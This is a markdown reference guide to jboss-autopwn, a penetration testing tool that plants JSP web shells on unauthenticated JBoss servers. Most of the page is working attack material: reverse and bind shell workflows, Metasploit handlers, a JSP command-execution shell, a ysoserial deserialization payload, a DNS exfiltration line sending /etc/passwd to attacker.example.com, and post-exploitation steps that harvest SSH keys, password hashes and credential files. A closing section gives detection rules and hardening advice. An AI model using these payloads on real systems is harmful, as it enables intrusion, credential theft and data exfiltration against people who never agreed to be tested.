---
title: jboss-autopwn
category: Initial Access
tags:
  - jboss
  - exploitation
  - java
  - shell
  - war-deployment
  - metasploit
mitre:
  tactic: TA0001
  technique: Initial Access
  id: T1190
difficulty: intermediate
platforms:
  - linux
  - windows
  - macos
languages:
  - bash
  - shell
dependencies:
  - netcat
  - curl
  - metasploit-framework
created: "2009"
author: Christian G. Papathanasiou
organization: SpiderLabs / Trustwave
license: GPL-3.0
status: archived
github: https://github.com/SpiderLabs/jboss-autopwn
---

# jboss-autopwn

## 1. Introduction & Overview

jboss-autopwn is a shell-based exploitation framework that deploys JSP web shells onto vulnerable JBoss Application Server instances and leverages the upload-and-execute capability to establish interactive OS-level access. Developed by Christian G. Papathanasiou at SpiderLabs (Trustwave), it targets JBoss AS deployments where the management console or deployment interface is accessible without authentication.

The tool operates in two scripts: `e.sh` for *nix targets (Linux, macOS) and `e2.sh` for Windows targets. Both scripts follow the same attack flow—retrieve a session cookie, craft a BeanShell (BSH) deployment script, build a `.war` file containing a JSP shell, deploy it via the JBoss JMX-Console or Web-Console, and then use the deployed shell to upload and execute bind/reverse payloads or Meterpreter/VNC stagers.

**Key characteristics:**

- Automates the entire JBoss exploitation chain from cookie retrieval to shell access
- Supports Linux, macOS, and Windows target operating systems
- Offers bind shell, reverse shell, Meterpreter, and VNC payload options
- Requires Metasploit Framework v3 installed as `framework3` in the current PATH
- Archived since August 2020; no longer maintained

**MITRE ATT&CK Mapping:**

| Tactic | Technique | ID |
|--------|-----------|-----|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Command and Scripting Interpreter | T1059 |
| Persistence | Server Software Component | T1505 |
| Lateral Movement | Remote Services | T1021 |

**When to use this tool:**

- During penetration tests against legacy JBoss AS installations (versions 4.x through 6.x)
- Against JBoss instances with exposed JMX-Console (`/jmx-console/`) or Web-Console (`/web-console/`) without authentication
- When targeting environments that still run older Java application servers

**When NOT to use this tool:**

- Against modern JBoss EAP/WildFly installations (post-6.x) with proper authentication
- When JMX-Console and Web-Console are behind authentication or disabled
- Production environments without explicit authorization

---

## 2. Installation & Setup

### Prerequisites

jboss-autopwn depends on three external tools:

| Dependency | Purpose | Install |
|------------|---------|---------|
| **netcat** | Reverse/bind shell connections | `apt install netcat-openbsd` |
| **curl** | HTTP requests for cookie retrieval and WAR deployment | `apt install curl` |
| **Metasploit Framework v3** | Payload generation and Meterpreter sessions | Must be installed as `framework3` in PATH |

### Installation Methods

**Method 1: Clone from GitHub (recommended)**

```bash
git clone https://github.com/SpiderLabs/jboss-autopwn.git
cd jboss-autopwn
chmod +x e.sh e2.sh
```

**Method 2: Direct download**

```bash
wget https://github.com/SpiderLabs/jboss-autopwn/archive/master.zip
unzip master.zip
cd jboss-autopwn-master
chmod +x e.sh e2.sh
```

### Metasploit Configuration

The script expects Metasploit to be installed at `framework3` in the current PATH. This is the legacy Metasploit v3 directory structure. For modern Metasploit installations, adjust the script or create a symlink:

```bash
ln -s /opt/metasploit-framework /usr/local/bin/framework3
```

**Important:** The tool references `msfcli` and `msfpayload`, which were deprecated in Metasploit 4.x+. These were replaced by `msfconsole` with the `-x` flag and `msfvenom`. Using this tool with modern Metasploit requires script modification or maintaining a v3 installation.

### Verify Installation

```bash
which curl
which nc
ls -la e.sh e2.sh
```

---

## 3. Basic Usage

### First Run

The simplest invocation against a JBoss target:

```bash
./e.sh 192.168.1.100 8080 2>/dev/null
```

**Explanation:** The `e.sh` script targets *nix systems. It takes two arguments: the target IP and the HTTP port where JBoss is listening. Stderr is redirected to suppress noisy output. The script will:

1. Retrieve a session cookie from the target
2. Create a BeanShell deployment script
3. Build a `.war` file containing a JSP shell
4. Deploy the WAR to the JBoss server
5. Query `id` and `uname` to confirm execution
6. Prompt for bind or reverse shell selection

### Essential Commands

**Linux bind shell (default workflow):**

```bash
# Start the exploitation
./e.sh 192.168.1.100 8080 2>/dev/null

# When prompted: "Would you like to upload a reverse or a bind shell?"
# Type: bind
# When prompted: "On which port would you like the bindshell to listen on?"
# Type: 31337

# In another terminal, connect:
nc -v 192.168.1.100 31337
```

**Linux reverse shell:**

```bash
# Terminal 1: Start listener
nc -lvnp 31337

# Terminal 2: Launch exploit
./e.sh 192.168.1.100 8080 2>/dev/null
# Select: reverse
# Port: 31337

# Back in Terminal 1, upgrade the shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Windows bind shell:**

```bash
./e2.sh 192.168.1.225 8080 2>/dev/null
# Select: bind
# Port: 31337
# Connect with Metasploit:
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/shell_bind_tcp; set RHOST 192.168.1.225; set LPORT 31337; run"
```

**Windows Meterpreter reverse shell:**

```bash
# Terminal 1: Launch exploit
./e2.sh 192.168.1.225 8080 2>/dev/null
# Select: reverse
# Port: 31337

# Terminal 2: Start Metasploit handler within 20 seconds
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.2; set LPORT 31337; run"
```

**Windows VNC injection:**

```bash
./e2.sh 192.168.1.225 8080 2>/dev/null
# Select: vnc
# Port: 5900
# Connect with VNC viewer to 192.168.1.225:5900
```

### Flags Reference

The scripts accept positional arguments only; there are no flags:

| Argument | Position | Description | Required |
|----------|----------|-------------|----------|
| `target_ip` | 1 | IP address of the JBoss server | Yes |
| `tcp_port` | 2 | HTTP port of JBoss (typically 8080) | Yes |

Both scripts suppress stderr with `2>/dev/null` by convention. All output goes to stdout.

---

## 4. Intermediate Usage

### Script Chaining

Combine jboss-autopwn with reconnaissance tools for a complete attack chain:

```bash
# Step 1: Discover JBoss instances
nmap -sV -p 8080,8443,443 192.168.1.0/24 | grep -i jboss

# Step 2: Verify JMX-Console access
curl -s -o /dev/null -w "%{http_code}" http://192.168.1.100:8080/jmx-console/

# Step 3: Deploy exploit
./e.sh 192.168.1.100 8080 2>/dev/null
```

### Batch Targeting

Wrap the tool in a loop for multiple targets:

```bash
#!/bin/bash
TARGETS=("192.168.1.10" "192.168.1.20" "192.168.1.30")
PORT=8080

for target in "${TARGETS[@]}"; do
    echo "[*] Testing $target"
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://$target:$PORT/jmx-console/")
    if [ "$STATUS" = "200" ]; then
        echo "[+] $target has JMX-Console exposed"
        echo "[*] Run: ./e.sh $target $PORT"
    else
        echo "[-] $target not vulnerable or JMX-Console not accessible"
    fi
done
```

### Post-Exploitation Workflow

After obtaining a shell, follow this sequence:

```bash
# 1. Stabilize the shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Enumerate the system
uname -a
cat /etc/passwd
ls -la /opt/jboss*/server/default/deploy/

# 3. Check for credential files
find / -name "*.properties" 2>/dev/null | head -20
grep -r "password" /opt/jboss/ 2>/dev/null

# 4. Pivot to other services
netstat -tlnp
cat /opt/jboss/server/default/conf/login-config.xml
```

---

## 5. Advanced Usage

### Custom JSP Shell Deployment

The default JSP shell deployed by jboss-autopwn provides command execution. For more sophisticated operations, replace the shell payload:

```bash
# Generate a custom WAR with msfvenom
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f war -o custom.war

# Deploy via JBoss deployment API (if authenticated)
curl -u admin:admin -X POST \
  -H "Content-Type: application/octet-stream" \
  --data-binary @custom.war \
  http://192.168.1.100:8080/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.deployment:type=DeploymentScanner,flavour=Main&methodName=scan&argType=java.lang.String&arg0=/tmp/custom.war
```

### Bypassing Firewall Restrictions

When outbound connections are blocked but DNS resolution works:

```bash
# Use DNS-based exfiltration after gaining shell access
# On attacker machine, set up a DNS listener
python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(('0.0.0.0', 53))
while True:
    data, addr = s.recvfrom(1024)
    print(f'Received from {addr}: {data}')
"

# From the target shell, exfiltrate via DNS
nslookup $(cat /etc/passwd | base64 | tr -d '\n').attacker.example.com
```

### JBoss Deserialization Attacks

For newer JBoss versions where the deployment method is patched but deserialization remains vulnerable:

```bash
# Generate a serialized Java object payload
java -jar ysoserial.jar CommonsCollections1 "bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}" > payload.bin

# Send via HTTP POST to vulnerable endpoint
curl -X POST \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.bin \
  http://192.168.1.100:8080/jmx-console/HtmlAdaptor
```

### Customizing Shell Payloads

Edit `e.sh` or `e2.sh` to modify the BSH deployment script. The key section creates a `.war` file in `/tmp`:

```bash
# Within e.sh, locate the WAR creation section
# The BSH script deploys to /tmp/browser/browser.jsp
# Modify the JSP content for custom functionality:

cat > /tmp/browser.jsp << 'SHELL'
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line + "<br>");
    }
}
%>
SHELL
```

---

## 6. Real-World Scenarios

### Scenario 1: Penetration Test Against Legacy JBoss AS 4.2

**Target:** Internal web application running JBoss AS 4.2.3.GA on port 8080 with JMX-Console exposed without authentication.

**Steps:**

```bash
# 1. Reconnaissance
nmap -sV -p 8080 10.0.0.50
# Output: 8080/tcp open http JBoss AS 4.2.3.GA

# 2. Verify JMX-Console
curl -s http://10.0.0.50:8080/jmx-console/ | head -20
# Returns JMX-Console HTML page

# 3. Exploit
./e.sh 10.0.0.50 8080 2>/dev/null
# Script deploys WAR, executes id command, returns root shell

# 4. Post-exploitation
python3 -c 'import pty; pty.spawn("/bin/bash")'
cat /opt/jboss-4.2.3.GA/server/default/conf/jboss-service.xml
# Finds database credentials in the datasources configuration
```

**Outcome:** Full system access, database credential extraction, lateral movement to internal database server.

### Scenario 2: Red Team Assessment with Meterpreter on Windows

**Target:** Windows Server 2008 running JBoss AS 6.1.0.Final with the Web-Console enabled.

**Steps:**

```bash
# 1. Start Metasploit handler in background
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.10.50; set LPORT 4444; exploit -j"

# 2. Deploy exploit
./e2.sh 192.168.10.100 8080 2>/dev/null
# Select: reverse
# Port: 4444

# 3. Interact with Meterpreter session
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:xxx:::
jboss_svc:1001:aad3b435b51404eeaad3b435b51404ee:xxx:::

# 4. Lateral movement
meterpreter > hashdump > hashes.txt
# Use hashes with Pass-the-Hash against other Windows hosts
```

**Outcome:** Domain credential extraction, lateral movement to file server, full domain compromise.

### Scenario 3: macOS JBoss Development Server Compromise

**Target:** macOS development workstation running JBoss AS locally for testing, accessible on port 8080.

**Steps:**

```bash
# 1. Verify target
curl -s -I http://192.168.1.50:8080/jmx-console/
# Returns 200 OK

# 2. Exploit
./e.sh 192.168.1.50 8080 2>/dev/null
# Select: bind
# Port: 31337

# 3. Connect
nc -v 192.168.1.50 31337
id
# uid=0(root) gid=0(wheel) groups=0(wheel),1(daemon),...

# 4. Access development resources
python3 -c 'import pty; pty.spawn("/bin/bash")'
ls ~/Projects/
cat ~/.ssh/id_rsa
```

**Outcome:** Developer credentials and SSH keys extracted, pivot to production environment via developer access.

---

## 7. Detection & Defense

### Indicators of Compromise (IOCs)

**Network-level:**

- HTTP POST requests to `/jmx-console/HtmlAdaptor` with serialized Java objects
- WAR file deployment requests to JBoss management interfaces
- Outbound connections from the JBoss server on unusual ports (31337, 4444, etc.)
- Netcat connections to non-standard ports from the application server

**Host-level:**

- New `.war` files in `JBOSS_HOME/server/default/deploy/` or `JBOSS_HOME/standalone/deployments/`
- JSP files created in temporary directories (`/tmp/browser/`)
- Suspicious process execution from `java` (e.g., spawning `cmd.exe`, `/bin/sh`, or `netcat`)
- Changes to JBoss configuration files (`jboss-service.xml`, `standalone.xml`)

### Detection Rules

**YARA rule for JBoss JSP shells:**

```yara
rule JBoss_JSP_Shell {
    meta:
        description = "Detects JSP web shells deployed on JBoss"
    strings:
        $jsp1 = "Runtime.getRuntime().exec"
        $jsp2 = "Process p"
        $jsp3 = "BufferedReader"
        $cmd1 = "getParameter(\"cmd\")"
        $cmd2 = "getParameter(\"c\")"
    condition:
        $jsp1 and ($cmd1 or $cmd2) and ($jsp2 or $jsp3)
}
```

**Suricata/Snort signature:**

```
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"JBoss Autopwn WAR Deployment";
    content:"POST"; http_method;
    content:"/jmx-console/"; http_uri;
    content:"HtmlAdaptor"; http_uri;
    classtype:web-application-attack;
    sid:1000001; rev:1;
)
```

### Hardening JBoss

1. **Disable JMX-Console and Web-Console** if not required
2. **Enable authentication** on all management interfaces
3. **Remove default applications** (`jmx-console.war`, `web-console.war`, `invoker/`)
4. **Run JBoss as a non-root, dedicated service account**
5. **Network segmentation:** isolate application servers from direct internet access
6. **Deploy a WAF** to block known exploitation patterns
7. **Regular patching:** upgrade from JBoss AS to WildFly/EAP with current patches

### WAF Rules (ModSecurity)

```apache
# Block JBoss management console access
SecRule REQUEST_URI "@beginsWith /jmx-console" \
    "id:1001,phase:1,deny,status:403,log,msg:'JBoss JMX Console Blocked'"

SecRule REQUEST_URI "@beginsWith /web-console" \
    "id:1002,phase:1,deny,status:403,log,msg:'JBoss Web Console Blocked'"

SecRule REQUEST_URI "@beginsWith /invoker" \
    "id:1003,phase:1,deny,status:403,log,msg:'JBoss Invoker Blocked'"
```

---

## 8. Troubleshooting

### Common Issues and Solutions

**Problem:** `curl: (7) Failed to connect` or empty output

```bash
# Verify JBoss is running and accessible
curl -v http://192.168.1.100:8080/
# Check if firewall blocks your IP
nmap -Pn -p 8080 192.168.1.100
```

**Problem:** Script hangs at "Retrieving cookie"

```bash
# JBoss may have authentication enabled on JMX-Console
# Test directly:
curl -v http://192.168.1.100:8080/jmx-console/
# If you get 401 Unauthorized, the exploit won't work without credentials
```

**Problem:** WAR deployment succeeds but no shell

```bash
# Check deployment directory on target (if you have other access)
# JBoss may have auto-deployment disabled or custom deploy directory
# Try deploying to a different location by editing the BSH script in e.sh
ls /opt/jboss/server/default/deploy/
```

**Problem:** `framework3/msfcli: not found`

```bash
# Metasploit v3 is no longer available. Options:
# 1. Use msfconsole instead (requires script modification)
# 2. Use the bind/reverse shell options without Metasploit
# 3. Manually set up a listener:
nc -lvnp 31337  # For reverse shell
msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x86/shell_reverse_tcp; set LPORT 31337; run"
```

**Problem:** Shell connects but immediately drops

```bash
# Firewall on target may be dropping outbound connections
# Try reverse shell instead of bind shell
# Or use a port that's already allowed (check with nmap from target if possible)
```

**Problem:** "Permission denied" on WAR deployment

```bash
# JBoss may require specific deployment credentials
# Check for default credentials:
# admin/admin, admin/password, jboss/jboss
curl -u admin:admin -X PUT http://192.168.1.100:8080/jmx-console/HtmlAdaptor
```

### Debugging

```bash
# Remove stderr redirect to see all errors
./e.sh 192.168.1.100 8080

# Trace HTTP requests
curl -v http://192.168.1.100:8080/jmx-console/

# Monitor network traffic during exploitation
tcpdump -i eth0 host 192.168.1.100 -w exploit_capture.pcap
```

---

## Resources

- **GitHub Repository:** https://github.com/SpiderLabs/jboss-autopwn
- **JBoss Security Documentation:** https://docs.redhat.com/en/documentation/red_hat_jboss_enterprise_application_platform
- **MITRE ATT&CK - Exploit Public-Facing Application:** https://attack.mitre.org/techniques/T1190/
- **JBoss CVE Database:** https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=jboss
- **Metasploit JBoss Modules:** `search jboss` in msfconsole
- **Nmap JBoss Scripts:** `ls /usr/share/nmap/scripts/ | grep jboss`
- **JBoss/WildFly Hardening Guide:** https://docs.wildfly.org/security-guide/

---

**See Also:**
- [jsql](../jsql/jsql.md) - SQL injection for extracting database information
- [sqlninja](../sqlninja/sqlninja.md) - SQL injection and takeover for MSSQL
